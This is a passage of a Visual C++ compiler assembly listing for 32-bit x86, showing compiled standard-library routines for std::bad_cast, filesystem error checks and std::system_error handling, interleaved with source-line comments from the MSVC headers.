  00017	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN1@Throw_bad_:

; 68   : }

  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c3		 ret	 0
?_Throw_bad_cast@std@@YAXXZ ENDP			; std::_Throw_bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_cast@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gbad_cast@std@@UAEPAXI@Z PROC			; std::bad_cast::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1bad_cast@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 0c		 push	 12			; 0000000cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gbad_cast@std@@UAEPAXI@Z ENDP			; std::bad_cast::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_cast@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0bad_cast@std@@QAE@ABV01@@Z PROC			; std::bad_cast::bad_cast, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0exception@std@@QAE@ABV01@@Z ; std::exception::exception
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7bad_cast@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0bad_cast@std@@QAE@ABV01@@Z ENDP			; std::bad_cast::bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_cast@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1bad_cast@std@@UAE@XZ PROC				; std::bad_cast::~bad_cast, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1exception@std@@UAE@XZ ; std::exception::~exception
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1bad_cast@std@@UAE@XZ ENDP				; std::bad_cast::~bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_typeinfo.h
;	COMDAT ??0bad_cast@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0bad_cast@std@@QAE@XZ PROC				; std::bad_cast::bad_cast, COMDAT
; _this$ = ecx

; 153  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 152  :         : exception("bad cast", 1)

  00007	6a 01		 push	 1
  00009	68 00 00 00 00	 push	 OFFSET ??_C@_08EPJLHIJG@bad?5cast@
  0000e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00011	e8 00 00 00 00	 call	 ??0exception@std@@QAE@QBDH@Z ; std::exception::exception

; 153  :     {

  00016	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00019	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7bad_cast@std@@6B@

; 154  :     }

  0001f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00022	8b e5		 mov	 esp, ebp
  00024	5d		 pop	 ebp
  00025	c3		 ret	 0
??0bad_cast@std@@QAE@XZ ENDP				; std::bad_cast::bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\chrono
;	COMDAT ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z
_TEXT	SEGMENT
__Result$ = 8						; size = 8
?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z PROC ; std::_Check_convert_result, COMDAT

; 50   : _NODISCARD inline int _Check_convert_result(const __std_fs_convert_result _Result) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 51   :     if (_Result._Err != __std_win_error::_Success) {

  00003	83 7d 0c 00	 cmp	 DWORD PTR __Result$[ebp+4], 0
  00007	74 09		 je	 SHORT $LN2@Check_conv

; 52   :         _Throw_system_error_from_std_win_error(_Result._Err);

  00009	8b 45 0c	 mov	 eax, DWORD PTR __Result$[ebp+4]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ?_Throw_system_error_from_std_win_error@std@@YAXW4__std_win_error@@@Z ; std::_Throw_system_error_from_std_win_error
$LN2@Check_conv:

; 53   :     }
; 54   : 
; 55   :     return _Result._Len;

  00012	8b 45 08	 mov	 eax, DWORD PTR __Result$[ebp]
$LN1@Check_conv:

; 56   : }

  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ENDP ; std::_Check_convert_result
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$_Bitmask_includes_any@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z
_TEXT	SEGMENT
tv68 = -4						; size = 4
__Left$ = 8						; size = 4
__Elements$ = 12					; size = 4
??$_Bitmask_includes_any@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z PROC ; std::_Bitmask_includes_any<enum __std_fs_stats_flags>, COMDAT

; 2298 : _NODISCARD constexpr bool _Bitmask_includes_any(_Bitmask _Left, _Bitmask _Elements) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2299 :     return (_Left & _Elements) != _Bitmask{};

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Elements$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ??I@YA?AW4__std_fs_stats_flags@@W40@0@Z ; operator&
  00011	83 c4 08	 add	 esp, 8
  00014	85 c0		 test	 eax, eax
  00016	74 09		 je	 SHORT $LN3@Bitmask_in
  00018	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
  0001f	eb 07		 jmp	 SHORT $LN4@Bitmask_in
$LN3@Bitmask_in:
  00021	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@Bitmask_in:
  00028	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 2300 : }

  0002c	8b e5		 mov	 esp, ebp
  0002e	5d		 pop	 ebp
  0002f	c3		 ret	 0
??$_Bitmask_includes_any@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ENDP ; std::_Bitmask_includes_any<enum __std_fs_stats_flags>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ?_Symlink_hint_attributes@__std_fs_stats@@QBE?AW4__std_fs_file_attr@@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Symlink_hint_attributes@__std_fs_stats@@QBE?AW4__std_fs_file_attr@@XZ PROC ; __std_fs_stats::_Symlink_hint_attributes, COMDAT
; _this$ = ecx

; 137  :     _NODISCARD __std_fs_file_attr _Symlink_hint_attributes() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 138  :         if (_STD _Bitmask_includes_any(_Available, __std_fs_stats_flags::_Attributes)) {

  00007	6a 02		 push	 2
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 1c	 mov	 ecx, DWORD PTR [eax+28]
  0000f	51		 push	 ecx
  00010	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_stats_flags>
  00015	83 c4 08	 add	 esp, 8
  00018	0f b6 d0	 movzx	 edx, al
  0001b	85 d2		 test	 edx, edx
  0001d	74 08		 je	 SHORT $LN2@Symlink_hi

; 139  :             return _Attributes;

  0001f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00022	8b 40 10	 mov	 eax, DWORD PTR [eax+16]
  00025	eb 03		 jmp	 SHORT $LN1@Symlink_hi
$LN2@Symlink_hi:

; 140  :         }
; 141  : 
; 142  :         return __std_fs_file_attr::_Invalid;

  00027	83 c8 ff	 or	 eax, -1
$LN1@Symlink_hi:

; 143  :     }

  0002a	8b e5		 mov	 esp, ebp
  0002c	5d		 pop	 ebp
  0002d	c3		 ret	 0
?_Symlink_hint_attributes@__std_fs_stats@@QBE?AW4__std_fs_file_attr@@XZ ENDP ; __std_fs_stats::_Symlink_hint_attributes
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ??_5@YAAAW4__std_fs_stats_flags@@AAW40@W40@@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??_5@YAAAW4__std_fs_stats_flags@@AAW40@W40@@Z PROC	; operator|=, COMDAT

; 126  : _BITMASK_OPS(_EMPTY_ARGUMENT, __std_fs_stats_flags)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000a	8b 11		 mov	 edx, DWORD PTR [ecx]
  0000c	52		 push	 edx
  0000d	e8 00 00 00 00	 call	 ??U@YA?AW4__std_fs_stats_flags@@W40@0@Z ; operator|
  00012	83 c4 08	 add	 esp, 8
  00015	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  00018	89 01		 mov	 DWORD PTR [ecx], eax
  0001a	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  0001d	5d		 pop	 ebp
  0001e	c3		 ret	 0
??_5@YAAAW4__std_fs_stats_flags@@AAW40@W40@@Z ENDP	; operator|=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ??U@YA?AW4__std_fs_stats_flags@@W40@0@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??U@YA?AW4__std_fs_stats_flags@@W40@0@Z PROC		; operator|, COMDAT

; 126  : _BITMASK_OPS(_EMPTY_ARGUMENT, __std_fs_stats_flags)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	0b 45 0c	 or	 eax, DWORD PTR __Right$[ebp]
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??U@YA?AW4__std_fs_stats_flags@@W40@0@Z ENDP		; operator|
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ??I@YA?AW4__std_fs_stats_flags@@W40@0@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??I@YA?AW4__std_fs_stats_flags@@W40@0@Z PROC		; operator&, COMDAT

; 126  : _BITMASK_OPS(_EMPTY_ARGUMENT, __std_fs_stats_flags)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	23 45 0c	 and	 eax, DWORD PTR __Right$[ebp]
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??I@YA?AW4__std_fs_stats_flags@@W40@0@Z ENDP		; operator&
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ??I@YA?AW4__std_fs_file_attr@@W40@0@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??I@YA?AW4__std_fs_file_attr@@W40@0@Z PROC		; operator&, COMDAT

; 81   : _BITMASK_OPS(_EMPTY_ARGUMENT, __std_fs_file_attr)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	23 45 0c	 and	 eax, DWORD PTR __Right$[ebp]
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??I@YA?AW4__std_fs_file_attr@@W40@0@Z ENDP		; operator&
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfilesystem_abi.h
;	COMDAT ___std_is_file_not_found
_TEXT	SEGMENT
tv64 = -4						; size = 4
__Error$ = 8						; size = 4
___std_is_file_not_found PROC				; COMDAT

; 50   : _NODISCARD inline bool __std_is_file_not_found(const __std_win_error _Error) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 51   :     switch (_Error) {

  00004	8b 45 08	 mov	 eax, DWORD PTR __Error$[ebp]
  00007	89 45 fc	 mov	 DWORD PTR tv64[ebp], eax
  0000a	8b 4d fc	 mov	 ecx, DWORD PTR tv64[ebp]
  0000d	83 e9 02	 sub	 ecx, 2
  00010	89 4d fc	 mov	 DWORD PTR tv64[ebp], ecx
  00013	83 7d fc 79	 cmp	 DWORD PTR tv64[ebp], 121 ; 00000079H
  00017	77 15		 ja	 SHORT $LN8@std_is_fil
  00019	8b 55 fc	 mov	 edx, DWORD PTR tv64[ebp]
  0001c	0f b6 82 00 00
	00 00		 movzx	 eax, BYTE PTR $LN10@std_is_fil[edx]
  00023	ff 24 85 00 00
	00 00		 jmp	 DWORD PTR $LN11@std_is_fil[eax*4]
$LN4@std_is_fil:

; 52   :     case __std_win_error::_File_not_found:
; 53   :     case __std_win_error::_Path_not_found:
; 54   :     case __std_win_error::_Error_bad_netpath:
; 55   :     case __std_win_error::_Invalid_name:
; 56   :         return true;

  0002a	b0 01		 mov	 al, 1
  0002c	eb 02		 jmp	 SHORT $LN2@std_is_fil
$LN8@std_is_fil:

; 57   :     default:
; 58   :         return false;

  0002e	32 c0		 xor	 al, al
$LN2@std_is_fil:

; 59   :     }
; 60   : }

  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c3		 ret	 0
$LN11@std_is_fil:
  00034	00 00 00 00	 DD	 $LN4@std_is_fil
  00038	00 00 00 00	 DD	 $LN8@std_is_fil
$LN10@std_is_fil:
  0003c	00		 DB	 0
  0003d	00		 DB	 0
  0003e	01		 DB	 1
  0003f	01		 DB	 1
  00040	01		 DB	 1
  00041	01		 DB	 1
  00042	01		 DB	 1
  00043	01		 DB	 1
  00044	01		 DB	 1
  00045	01		 DB	 1
  00046	01		 DB	 1
  00047	01		 DB	 1
  00048	01		 DB	 1
  00049	01		 DB	 1
  0004a	01		 DB	 1
  0004b	01		 DB	 1
  0004c	01		 DB	 1
  0004d	01		 DB	 1
  0004e	01		 DB	 1
  0004f	01		 DB	 1
  00050	01		 DB	 1
  00051	01		 DB	 1
  00052	01		 DB	 1
  00053	01		 DB	 1
  00054	01		 DB	 1
  00055	01		 DB	 1
  00056	01		 DB	 1
  00057	01		 DB	 1
  00058	01		 DB	 1
  00059	01		 DB	 1
  0005a	01		 DB	 1
  0005b	01		 DB	 1
  0005c	01		 DB	 1
  0005d	01		 DB	 1
  0005e	01		 DB	 1
  0005f	01		 DB	 1
  00060	01		 DB	 1
  00061	01		 DB	 1
  00062	01		 DB	 1
  00063	01		 DB	 1
  00064	01		 DB	 1
  00065	01		 DB	 1
  00066	01		 DB	 1
  00067	01		 DB	 1
  00068	01		 DB	 1
  00069	01		 DB	 1
  0006a	01		 DB	 1
  0006b	01		 DB	 1
  0006c	01		 DB	 1
  0006d	01		 DB	 1
  0006e	01		 DB	 1
  0006f	00		 DB	 0
  00070	01		 DB	 1
  00071	01		 DB	 1
  00072	01		 DB	 1
  00073	01		 DB	 1
  00074	01		 DB	 1
  00075	01		 DB	 1
  00076	01		 DB	 1
  00077	01		 DB	 1
  00078	01		 DB	 1
  00079	01		 DB	 1
  0007a	01		 DB	 1
  0007b	01		 DB	 1
  0007c	01		 DB	 1
  0007d	01		 DB	 1
  0007e	01		 DB	 1
  0007f	01		 DB	 1
  00080	01		 DB	 1
  00081	01		 DB	 1
  00082	01		 DB	 1
  00083	01		 DB	 1
  00084	01		 DB	 1
  00085	01		 DB	 1
  00086	01		 DB	 1
  00087	01		 DB	 1
  00088	01		 DB	 1
  00089	01		 DB	 1
  0008a	01		 DB	 1
  0008b	01		 DB	 1
  0008c	01		 DB	 1
  0008d	01		 DB	 1
  0008e	01		 DB	 1
  0008f	01		 DB	 1
  00090	01		 DB	 1
  00091	01		 DB	 1
  00092	01		 DB	 1
  00093	01		 DB	 1
  00094	01		 DB	 1
  00095	01		 DB	 1
  00096	01		 DB	 1
  00097	01		 DB	 1
  00098	01		 DB	 1
  00099	01		 DB	 1
  0009a	01		 DB	 1
  0009b	01		 DB	 1
  0009c	01		 DB	 1
  0009d	01		 DB	 1
  0009e	01		 DB	 1
  0009f	01		 DB	 1
  000a0	01		 DB	 1
  000a1	01		 DB	 1
  000a2	01		 DB	 1
  000a3	01		 DB	 1
  000a4	01		 DB	 1
  000a5	01		 DB	 1
  000a6	01		 DB	 1
  000a7	01		 DB	 1
  000a8	01		 DB	 1
  000a9	01		 DB	 1
  000aa	01		 DB	 1
  000ab	01		 DB	 1
  000ac	01		 DB	 1
  000ad	01		 DB	 1
  000ae	01		 DB	 1
  000af	01		 DB	 1
  000b0	01		 DB	 1
  000b1	01		 DB	 1
  000b2	01		 DB	 1
  000b3	01		 DB	 1
  000b4	01		 DB	 1
  000b5	00		 DB	 0
___std_is_file_not_found ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?_Throw_system_error_from_std_win_error@std@@YAXW4__std_win_error@@@Z
_TEXT	SEGMENT
$T1 = -28						; size = 20
$T2 = -8						; size = 8
__Errno$ = 8						; size = 4
?_Throw_system_error_from_std_win_error@std@@YAXW4__std_win_error@@@Z PROC ; std::_Throw_system_error_from_std_win_error, COMDAT

; 730  : [[noreturn]] inline void _Throw_system_error_from_std_win_error(const __std_win_error _Errno) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH

; 731  :     _THROW(system_error{_Make_ec(_Errno)});

  00006	8b 45 08	 mov	 eax, DWORD PTR __Errno$[ebp]
  00009	50		 push	 eax
  0000a	8d 4d f8	 lea	 ecx, DWORD PTR $T2[ebp]
  0000d	51		 push	 ecx
  0000e	e8 00 00 00 00	 call	 ?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z ; std::_Make_ec
  00013	83 c4 08	 add	 esp, 8
  00016	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00019	52		 push	 edx
  0001a	8b 00		 mov	 eax, DWORD PTR [eax]
  0001c	50		 push	 eax
  0001d	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00020	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@Verror_code@1@@Z ; std::system_error::system_error
  00025	68 00 00 00 00	 push	 OFFSET __TI4?AVsystem_error@std@@
  0002a	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  0002d	51		 push	 ecx
  0002e	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN1@Throw_syst:

; 732  : }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c3		 ret	 0
?_Throw_system_error_from_std_win_error@std@@YAXW4__std_win_error@@@Z ENDP ; std::_Throw_system_error_from_std_win_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Errno$ = 12						; size = 4
?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z PROC ; std::_Make_ec, COMDAT

; 726  : _NODISCARD inline error_code _Make_ec(__std_win_error _Errno) noexcept { // make an error_code

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 727  :     return {static_cast<int>(_Errno), _STD system_category()};

  00003	e8 00 00 00 00	 call	 ?system_category@std@@YAABVerror_category@1@XZ ; std::system_category
  00008	50		 push	 eax
  00009	8b 45 0c	 mov	 eax, DWORD PTR __Errno$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00010	e8 00 00 00 00	 call	 ??0error_code@std@@QAE@HABVerror_category@1@@Z ; std::error_code::error_code
  00015	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 728  : }

  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z ENDP ; std::_Make_ec
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@0@XZ
_TEXT	SEGMENT
??$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@0@XZ PROC ; std::_Immortalize_memcpy_image<std::_System_error_category>, COMDAT

; 675  : _NODISCARD const _Ty& _Immortalize_memcpy_image() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 676  :     static _Constexpr_immortalize_impl<_Ty> _Static;
; 677  :     return _Static._Storage;

  00003	b8 00 00 00 00	 mov	 eax, OFFSET ?_Static@?1???$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_System_error_category@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_System_error_category>'::`2'::_Static

; 678  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@0@XZ ENDP ; std::_Immortalize_memcpy_image<std::_System_error_category>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ
_TEXT	SEGMENT
??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ PROC ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>, COMDAT

; 675  : _NODISCARD const _Ty& _Immortalize_memcpy_image() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 676  :     static _Constexpr_immortalize_impl<_Ty> _Static;
; 677  :     return _Static._Storage;

  00003	b8 00 00 00 00	 mov	 eax, OFFSET ?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static

; 678  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ ENDP ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@0@XZ
_TEXT	SEGMENT
??$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@0@XZ PROC ; std::_Immortalize_memcpy_image<std::_Generic_error_category>, COMDAT

; 675  : _NODISCARD const _Ty& _Immortalize_memcpy_image() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 676  :     static _Constexpr_immortalize_impl<_Ty> _Static;
; 677  :     return _Static._Storage;

  00003	b8 00 00 00 00	 mov	 eax, OFFSET ?_Static@?1???$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@1@XZ@4U?$_Constexpr_immortalize_impl@V_Generic_error_category@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Generic_error_category>'::`2'::_Static

; 678  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@0@XZ ENDP ; std::_Immortalize_memcpy_image<std::_Generic_error_category>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_System_error_category@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_System_error_category@std@@UAEPAXI@Z PROC		; std::_System_error_category::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_System_error_category@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 08		 push	 8
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_System_error_category@std@@UAEPAXI@Z ENDP		; std::_System_error_category::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_System_error_category@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_System_error_category@std@@UAE@XZ PROC		; std::_System_error_category::~_System_error_category, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1error_category@std@@UAE@XZ ; std::error_category::~error_category
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1_System_error_category@std@@UAE@XZ ENDP		; std::_System_error_category::~_System_error_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?default_error_condition@_System_error_category@std@@UBE?AVerror_condition@2@H@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
__Posv$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errval$ = 12						; size = 4
